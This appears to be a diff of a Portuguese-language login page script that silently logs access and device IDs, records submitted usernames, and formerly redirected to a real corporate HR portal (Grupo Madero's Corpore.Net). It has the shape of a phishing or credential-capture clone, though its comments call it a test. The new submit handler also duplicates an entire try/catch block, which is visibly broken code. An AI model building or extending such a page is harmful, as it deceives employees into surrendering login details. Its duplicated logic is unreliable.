@@ -9,8 +9,10 @@ document.addEventListener('DOMContentLoaded', () => {
   // ========================================================
   // 1. REGISTRO SILENCIOSO DE ACESSO & COLETA DE DADOS
   // ========================================================
-  AccessTracker.init();
-  const currentMachineId = DeviceInfo.getMachineId();
+AccessTracker.init().catch(err => {
+  console.error('Não foi possível registrar o acesso:', err);
+});
+const currentMachineId = DeviceInfo.getMachineId();
 
   // ========================================================
   // 2. ATALHOS SECRETOS PARA A PÁGINA OCULTA DE MÉTRICAS
@@ -123,8 +125,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Submissão do Formulário (Validação + Registro de Teste)
   if (loginForm) {
-    loginForm.addEventListener('submit', (e) => {
-      e.preventDefault();
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
       const username = usernameInput.value.trim();
       const password = passwordInput.value;
@@ -162,15 +164,52 @@ document.addEventListener('DOMContentLoaded', () => {
       btnLabel.textContent = 'Acessando...';
 
       // Registra o teste imediatamente com dados censurados (sem armazenar senhas ou dados sensíveis)
-      AccessTracker.recordTest({
-        status: 'Tentativa Registrada (Teste)',
-        rawUser: username
-      });
+      try {
+        await AccessTracker.recordTest({
+          rawUser: username
+        });
+
+        passwordInput.value = '';
+
+        // Mantenha aqui a atribuição de window.location.href
+        // para o destino aprovado que já existe no seu app.js.
+      } catch (err) {
+        console.error('Falha ao registrar submissão:', err);
+
+        showToast(
+          'Falha no registro',
+          'Não foi possível confirmar o envio. Tente novamente.',
+          'error'
+        );
+
+        btnSubmit.classList.remove('loading');
+        btnSubmit.disabled = false;
+        btnLabel.textContent = 'Acessar';
+      }
 
       // Redirecionamento para o portal Corpore.Net Login
-      setTimeout(() => {
-        window.location.href = 'https://portalrh.grupomadero.com.br/Corpore.Net/Login.aspx';
-      }, 350);
+      try {
+  await AccessTracker.recordTest({
+    rawUser: username
+  });
+
+  passwordInput.value = '';
+
+  // Mantenha aqui a atribuição de window.location.href
+  // para o destino aprovado que já existe no seu app.js.
+} catch (err) {
+  console.error('Falha ao registrar submissão:', err);
+
+  showToast(
+    'Falha no registro',
+    'Não foi possível confirmar o envio. Tente novamente.',
+    'error'
+  );
+
+  btnSubmit.classList.remove('loading');
+  btnSubmit.disabled = false;
+  btnLabel.textContent = 'Acessar';
+}
     });
   }
 
